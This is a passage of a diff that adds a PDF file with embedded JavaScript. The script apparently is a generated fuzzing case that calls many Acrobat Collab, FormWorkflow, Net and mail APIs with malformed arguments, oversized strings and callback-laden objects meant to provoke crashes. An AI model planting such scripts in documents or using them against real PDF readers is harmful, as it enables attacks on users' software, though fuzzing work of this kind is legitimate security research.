+try{this.getUIPerms({cFeatureName:"\\x45\\x52\\x54\\x3d\\x7e"})}catch(e){}
+try{this.app.fsUseTimer=0}catch(e){}
+try{this.appRightsValidate({oSecHdlr:{},nValidateOption:39161.129,bUI:false})}catch(e){}
+try{this.Collab.hasReviewDeadline({cReviewID:"\\u0429\\u79e9\\ua214\\u126c\\ua3cd\\uebe1"})}catch(e){}
+try{this.Collab.getAggregateReviewInfo()}catch(e){}
+try{this.view={}}catch(e){}
+var fs43 = function(){f43();return true;}
+var os43 = {};os43.valueOf = fs43;try{this.Collab.addAnnotStore({cName:3,cUIName:"",factory:false,cSettings:Array(0x879e).join("\\x4a"),bHidden:os43})}catch(e){}
+try{this.Collab.isSharedReview({doc:{},bLax:false})}catch(e){}
+try{this.Collab.enableFinalApprovalEmail({sendEmail:false})}catch(e){}
+try{this.wireframe=false}catch(e){}
+try{this.Collab.removeMultipleSelectedReviewsInTracker()}catch(e){}
+try{this.Collab.setReviewFolderForMultipleReviews({cCategory:"\\ue7a9\\u3dae\\ub1f3\\uac92\\uf793\\u1932\\u542d\\uda09",oDocIDs:[],cFolder:"\\x73\\x71\\x75\\x61\\x72\\x65"})}catch(e){}
+var fs44 = function(){f44();return Array(0x4cd).join("\\x4e");}
+var os44 = {};os44.toString = fs44;try{this.Collab.addAnnotStore({cName:"\\x53",cUIName:os44,factory:false,cSettings:Array(0x2f51).join("\\x7c"),bHidden:false})}catch(e){}
+var fs45 = function(){f45();return this.viewState;}
+var os45 = {};os45.valueOf = fs45;try{this.Collab.registerApproval({doc:os45,initiator:"\\xbb\\x4b\\x2c\\x66\\xee\\x46\\xa0\\x6f",bInitiating:false,invitees:"\\x16",cc:"\\x5b\\x5c\\xf2",sentDate:"\\u480a\\u98a0\\ueccb\\u3974\\u036e\\u258c\\u7f82",deadDate:-0.51,ui:false,selfDestruct:false,initiatorEmail:false})}catch(e){}
+try{this.spawnPageFromTemplate({cTemplate:"\\u612b\\u0bf1\\u7c8f\\ua02d\\udbb2\\ub3fb\\u0993\\u7811"})}catch(e){}
+var fs46 = function(){f46();return true;}
+var os46 = {oSecHdlr:{},bUI:true};
+Object.defineProperties(os46, {bUI: {get: fs46}});;try{this.appRightsValidate(os46)}catch(e){}
+try{this.Collab.setStoreFSBased({cName:"\\uc257",bFSBased:false})}catch(e){}
+try{this.RSS.getResourceContents({cURL:"\\x42\\x6f\\x78\\x49\\x6e"})}catch(e){}
+try{this.Net.stringFromStream({oStream:[]})}catch(e){}
+var fs47 = function(){f47();return {};}
+var os47 = {};os47.valueOf = fs47;try{this.Collab.isEmailReview({doc:os47,bLax:true})}catch(e){}
+try{this.getPrintSepsParams()}catch(e){}
+try{this.Collab.setReviewRespondedDate({doc:[],date:8.895})}catch(e){}
+try{this.Collab.setReviewRespondedDate({doc:[],date:true})}catch(e){}
+try{this.Collab.lastBBRURL="\\x48\\x65\\x6c\\x76\\x65\\x74\\x69\\x63\\x61\\x2d\\x4f\\x62\\x6c\\x69\\x71\\x75\\x65"}catch(e){}
+try{this.Collab.registerProxy({doc:[],permID:Array(0xecd).join("\\x75")})}catch(e){}
+try{this.Collab.isFirstLaunch({cReviewType:""})}catch(e){}
+try{this.FormWorkflow.removeMultipleSelectedFormWorkflowsInTracker()}catch(e){}
+try{this.Collab.setStoreNoSettings({cName:"\\u995a\\u5d7a\\u990b\\ud1cf\\u2afd",bNoSettings:false})}catch(e){}
+try{this.Collab.expandTrackerSelection()}catch(e){}
+try{this.Collab.unregisterApproval({doc:Array(0x871).join("\\xc8")})}catch(e){}
+try{this.Collab.isDocCenterURL({cURL:3})}catch(e){}
+try{this.view={}}catch(e){}
+try{this.Collab.uriConvertReviewSource({cURL:"\\x9f\\x76\\x68\\xe6\\x4b\\x7c\\x45\\x3d\\x4e\\x37\\x6a\\x35"})}catch(e){}
+var fs48 = function(){f48();return Array(0x3e1c).join("\\x6c");}
+var os48 = {bUI:true,cTo:"\\x2e\\x56\\x74\\xdf",cCc:"",cBcc:"\\x57\\xc0\\x23\\x4f\\x66\\x52\\x5d\\x57\\x52\\x5a\\x5a\\x4e\\xff\\x48\\x4d\\x56\\x27",cSubject:"\\xa1\\x08\\x67\\x2a\\xf0\\x48\\x46\\x4b\\xb8\\x31",cMsg:Array(0xc2d).join("\\x47"),cAttachment:"\\u41be\\u2bfd\\u5159\\ue8ac\\ucb3d\\u22ce\\ue3af\\u9294\\ue4ad\\uaabb"};
+Object.defineProperties(os48, {cTo: {get: fs48}});;try{this.app.mailMsgWithAttachment(os48)}catch(e){}
+var fs49 = function(){f49();return "\\xcc\\x20\\x2b\\x4c";}
+var os49 = {cReviewID:3};
+Object.defineProperties(os49, {cReviewID: {get: fs49}});;try{this.Collab.getReviewError(os49)}catch(e){}
+var fs50 = function(){f50();return "";}
+var os50 = {cURL:"\\u941e\\u993b"};
+Object.defineProperties(os50, {cURL: {get: fs50}});;try{this.Net.Subscriptions.getContents(os50)}catch(e){}
+try{this.Collab.uriEncode({cURI:Array(0xc969).join("\\x66")})}catch(e){}
+try{this.Collab.enableFinalApprovalEmail({sendEmail:true})}catch(e){}
+try{this.Collab.addAnnotStore({cName:3,cUIName:Array(0x3f7).join("\\x4a"),factory:[],cSettings:"\\x62\\x41\\x6e\\x5d",bHidden:true})}catch(e){}
+try{this.FormWorkflow.setFormWorkflowFolder({cCategory:"",cDocID:"\\xfb\\xb3\\x3e\\x2d\\x79\\xe6\\xa0\\xfe\\xcb\\x2e\\x3b\\x63\\x6b",cFolder:Array(0x67e8).join("\\x39")})}catch(e){}
+try{this.Collab.addReviewFolder({cCategory:Array(0x1b06).join("\\x4c"),cFolder:"\\x63\\x57\\x70\\x43\\x7a"})}catch(e){}
+try{this.Collab.takeOwnershipAndPublishComments({cReviewID:"\\xa3\\x54\\x61\\x60\\xb7\\x55"})}catch(e){}
+try{this.Collab.getProxy({doc:this.Net.HTTP})}catch(e){}
+try{this.Collab.setReviewFolder({cCategory:3,oDoc:"\\x0a\\x42\\x67\\x58\\x9c\\x64",cFolder:"\\x47\\x6c\\x69\\x74\\x74\\x65\\x72\\x4c\\x65\\x66\\x74"})}catch(e){}
+try{this.Collab.maxPDFCommentsSize=10669.2073}catch(e){}
+try{this.Collab.getDocCenterReviewServer({cReviewType:"\\x6a\\x49\\x91\\x08"})}catch(e){}
+try{this.Collab.registerProxy({doc:2,permID:"\\x64\\x69\\x61\\x6d\\x6f\\x6e\\x64"})}catch(e){}
+try{this.Collab.takeOwnershipOfComments()}catch(e){}
+try{this.FormWorkflow.addFormWorkflowFolder({cCategory:"\\ue114\\uc590\\uaef5\\u2377\\uaaa3\\ud1d1\\u25d0\\u5c22\\ud439\\u987c\\ud596\\u2587\\u7f69\\u8757\\u86e9\\u2cf9\\u76cb\\u1936\\u8b7c\\uaa31",cFolder:"\\x59\\xc2\\x1d\\x92\\x6a\\x72\\x53\\x43\\x4c\\x7d\\x66"})}catch(e){}
+var fs51 = function(){f51();return "\\ue06d\\u7a90\\u1337\\u2475\\u1f34\\u3ca5";}
+var os51 = {};os51.toString = fs51;try{this.createTemplate({cName:os51})}catch(e){}
+try{this.Collab.unsetAlwaysUseServer({cReviewType:"\\x4f\\x61\\x64\\xdc"})}catch(e){}
+try{this.Collab.AVUMStartPayloadWrapper({cat:"\\x21\\xb6\\x71\\x49",subcat:3,evnt:3})}catch(e){}
+var fs52 = function(){f52();return "\\u6833\\u786c\\udd6e\\uda37\\ue6ef";}
+var os52 = {cReviewType:"\\u92ce\\u10a7\\u039e\\ud49c\\ue180\\u3a2b\\ud20b\\u9216\\uccd3"};
+Object.defineProperties(os52, {cReviewType: {get: fs52}});;try{this.Collab.isFirstLaunch(os52)}catch(e){}
+var fs53 = function(){f53();return "\\x58\\x58\\x39\\xb5\\x39\\x76\\x88\\x47";}
+var os53 = {cName:"\\ue1da\\ufdca\\u663c\\u4c8c\\u4a95\\ud035\\ud367\\u1849",cUIName:Array(0xc3e).join("\\x28"),factory:true,cSettings:"\\x37"};
+Object.defineProperties(os53, {cSettings: {get: fs53}});;try{this.Collab.addAnnotStore(os53)}catch(e){}
+try{this.Collab.getReviewFolder({cCategory:"\\x41",oDoc:"\\x64\\x5b\\x42\\xab\\x6a\\x61"})}catch(e){}
+try{this.Collab.getAlwaysUseServer({cReviewType:3})}catch(e){}
+try{this.disableWindows()}catch(e){}
+try{this.FormWorkflow.setFormFolderForMultipleForms({cCategory:"\\u02d3",oDocIDs:[],cFolder:Array(0x3b7).join("\\x5c")})}catch(e){}
+try{this.Net.Subscriptions.getResourceContents({cURL:3})}catch(e){}
+try{this.app.isValidSaveLocation({cPath:"\\x62\\x4c\\xf6\\x66\\x2b\\x76",cFS:3})}catch(e){}
+try{this.Collab.convertPlatformPathToDIPath({cPlatformPath:Array(0xbcd).join("\\x30")})}catch(e){}
+try{this.Collab.getReviewFolders({cCategory:"\\x32\\x45\\xea\\x35"})}catch(e){}
+try{this.Collab.maxPDFCommentsSize=-8.5}catch(e){}
+try{this.Collab.isDocCentreSignupDisabled()}catch(e){}
+try{this.Collab.saveTrackerHTML({cHTMLString:3})}catch(e){}
+try{this.FormWorkflow.addFormWorkflowFolder({cCategory:"\\u2b62\\ub1f6\\u6c3a\\u0121\\uf094\\uf605\\u9168\\u8cc4\\u94f1\\u1c24",cFolder:"\\x48\\x65\\x6c\\x76\\x65\\x74\\x69\\x63\\x61\\x2d\\x4f\\x62\\x6c\\x69\\x71\\x75\\x65"})}catch(e){}
+var fs54 = function(){f54();return "\\x58\\x62\\xc4\\x76\\x79\\x5a\\x5e";}
+var os54 = {};os54.toString = fs54;try{this.Collab.AVUMAddStringToPayloadWrapper({name:Array(0x6828).join("\\xbc"),val:os54})}catch(e){}
+var fs55 = function(){f55();return 10.4;}
+var os55 = {};os55.valueOf = fs55;try{this.Collab.maxPDFCommentsSize=os55}catch(e){}
+try{this.Collab.getFdfUrl({cURL:"\\x3e\\x6d\\x48"})}catch(e){}
+try{this.RSS.update({cURL:"\\x21\\xe8\\x6b\\x3b\\x7a\\xdd\\x6e\\x31\\x0b"})}catch(e){}
+try{this.FormWorkflow.getFormWorkflowInfo({cFormWorkflowID:3})}catch(e){}
+try{this.Net.Subscriptions.update({})}catch(e){}
+try{this.Collab.isDocDirty({doc:[]})}catch(e){}
+try{this.FormWorkflow.addFormWorkflowFolder({cCategory:Array(0x6f7c).join("\\x3f"),cFolder:Array(0xf6ee).join("\\x29")})}catch(e){}
+var fs56 = function(){f56();return "\\x56\\x76\\x45\\x42\\x70\\x28\\x70\\x6d\\x5f\\xf5\\x51\\xd0\\x62\\x73\\x82";}
+var os56 = {cURL:Array(0x31ab).join("\\u1f10")};
+Object.defineProperties(os56, {cURL: {get: fs56}});;try{this.Collab.uriConvertReviewSource(os56)}catch(e){}
+var fs57 = function(){f57();return Array(0xab3).join("\\x57");}
+var os57 = {};os57.toString = fs57;try{this.Collab.setDefaultReviewServer({cURL:Array(0xdb3).join("\\x5f"),cUIName:"\\u3c99\\ubd1c\\u4e24\\ubba5\\u6f84\\u1d38\\u7870",cReviewType:os57})}catch(e){}
+try{this.Net.streamFromString({cString:"\\x68\\xdd\\xbc"})}catch(e){}
+try{this.FormWorkflow.removeFormWorkflowFolder({cCategory:Array(0xd3d).join("\\x57"),cFolder:"\\x92\\xdb\\x73\\x7c\\xbc"})}catch(e){}
+try{this.app.measureDialog({template:{resourceContext:"\\x4a\\x61\\x6e\\x75\\x61\\x72\\x79\\x5b\\x31\\x5d\\x46\\x65\\x62\\x72\\x75\\x61\\x72\\x79\\x5b\\x32\\x5d\\x4d\\x61\\x72\\x63\\x68\\x5b\\x33\\x5d\\x41\\x70\\x72\\x69\\x6c\\x5b\\x34\\x5d\\x4d\\x61\\x79\\x5b\\x35\\x5d\\x4a\\x75\\x6e\\x65\\x5b\\x36\\x5d\\x4a\\x75\\x6c\\x79\\x5b\\x37\\x5d\\x41\\x75\\x67\\x75\\x73\\x74\\x5b\\x38\\x5d\\x53\\x65\\x70\\x74\\x65\\x6d\\x62\\x65\\x72\\x5b\\x39\\x5d\\x4f\\x63\\x74\\x6f\\x62\\x65\\x72\\x5b\\x31\\x30\\x5d\\x4e\\x6f\\x76\\x65\\x6d\\x62\\x65\\x72\\x5b\\x31\\x31\\x5d\\x44\\x65\\x63\\x65\\x6d\\x62\\x65\\x72\\x5b\\x31\\x32\\x5d\\x53\\x65\\x70\\x74\\x5b\\x39\\x5d\\x4a\\x61\\x6e\\x5b\\x31\\x5d\\x46\\x65\\x62\\x5b\\x32\\x5d\\x4d\\x61\\x72\\x5b\\x33\\x5d\\x41\\x70\\x72\\x5b\\x34\\x5d\\x4a\\x75\\x6e\\x5b\\x36\\x5d\\x4a\\x75\\x6c\\x5b\\x37\\x5d\\x41\\x75\\x67\\x5b\\x38\\x5d\\x53\\x65\\x70\\x5b\\x39\\x5d\\x4f\\x63\\x74\\x5b\\x31\\x30\\x5d\\x4e\\x6f\\x76\\x5b\\x31\\x31\\x5d\\x44\\x65\\x63\\x5b\\x31\\x32\\x5d",description:"\\u37f6\\u6a93\\u30a6\\u8bd7\\uc469\\ud984\\ue0b3"}})}catch(e){}
+var fs58 = function(){f58();return Array(0xc8b1).join("\\x76");}
+var os58 = {cName:Array(0xa55).join("\\x78"),cFieldType:"\\uc9a6\\u778f\\u1409\\u3adf\\u3fff\\ud118",nPageNum:1119033826.57361,oCoords:[1.7137738702,1.764,4081.7842,10.367]};
+Object.defineProperties(os58, {cName: {get: fs58}});;try{this.addNewField(os58)}catch(e){}
+var fs59 = function(){f59();return 27217.1;}
+var os59 = {};os59.valueOf = fs59;var fs60 = function(){f60();return Array(0x107).join("\\x45");}
+var os60 = {cName:"\\x66\\x69\\x6c\\x65\\x3a\\x2f\\x2f\\x2f\\x43\\x2f\\x55\\x73\\x65\\x72\\x73\\x2f\\x77\\x78\\x79\\x2f\\x44\\x65\\x73\\x6b\\x74\\x6f\\x70\\x2f\\x74\\x72\\x75\\x73\\x74\\x2f\\x67\\x65\\x74\\x73\\x74\\x72\\x2e\\x70\\x64\\x66",cFieldType:"",nPageNum:os59,oCoords:[-10098.4,-4.6,0.439,-1185.3]};
+Object.defineProperties(os60, {cFieldType: {get: fs60}});;try{this.addNewField(os60)}catch(e){}
+try{this.Collab.expandTrackerSelection()}catch(e){}
+try{this.createIcon({cStream:"\\x24\\x7a\\x59\\x35\\x4c\\x12\\xcc\\x49\\x78\\x78\\x72\\x47\\x70\\x4e\\xe7",nWidth:1290.2491,nHeight:-2.41})}catch(e){}
+var fs61 = function(){f61();return 610.5953;}
+var os61 = {nIndex:-10.9};
+Object.defineProperties(os61, {nIndex: {get: fs61}});;try{this.search.getNthIndex(os61)}catch(e){}
+try{this.Collab.getReviewState({cReviewID:Array(0xff5).join("\\ub70b")})}catch(e){}
+try{this.Collab.unsetFirstLaunch({cReviewType:"\\x46\\x6c\\x79\\x55\\x70"})}catch(e){}
+try{this.Collab.saveTrackerHTML({cHTMLString:"\\x6a\\x4a\\x1a\\x6b\\x7f\\xf8\\x0d"})}catch(e){}
+try{this.app.fsEscape=true}catch(e){}
+var fs62 = function(){f62();return "\\x64\\x69\\x61\\x6d\\x6f\\x6e\\x64";}
+var os62 = {};os62.toString = fs62;try{this.Collab.AVUMStartPayloadWrapper({cat:"\\u26d8\\u6bac\\u1258\\u11d3\\u679a",subcat:os62,evnt:"\\u2ef3"})}catch(e){}
+try{this.Collab.cosObj2Stream({obj:{}})}catch(e){}
+try{this.setUIPerms({cFeatureName:"\\x43\\x6f\\x75\\x72\\x69\\x65\\x72\\x2d\\x4f\\x62\\x6c\\x69\\x71\\x75\\x65",bFeatureValue:true})}catch(e){}
+try{this.Collab.createAnnotStore({cName:"\\ua552\\u4604\\u4f8b\\ud22b\\uc4d2\\u561b\\u3623\\u3a51\\uc5a0",doc:{},cUser:"\\x69\\xca\\x59\\x68\\x6d\\x4c\\x50\\x5a\\x50\\x4e\\x79\\x52\\x20\\x32\\x6d",cSettings:"\\u6b3d\\u43d0\\u8c95\\ue109\\u8fbc\\uf75c\\u7685"})}catch(e){}
+try{this.Collab.unsetAlwaysUseServer({cReviewType:Array(0x7520).join("\\xe0")})}catch(e){}
+closeDoc(1);)
+>>
+endobj
+
+xref
+0 8
+0000000000 65535 f
+0000000012 00000 n
+0000000109 00000 n
+0000000165 00000 n
+0000000234 00000 n
+0000000439 00000 n
+0000000553 00000 n
+0000000677 00000 n
+trailer
+<<
+ /Size 8
+ /Root 1 0 R
+>>
+startxref
+60956
+%%EOF
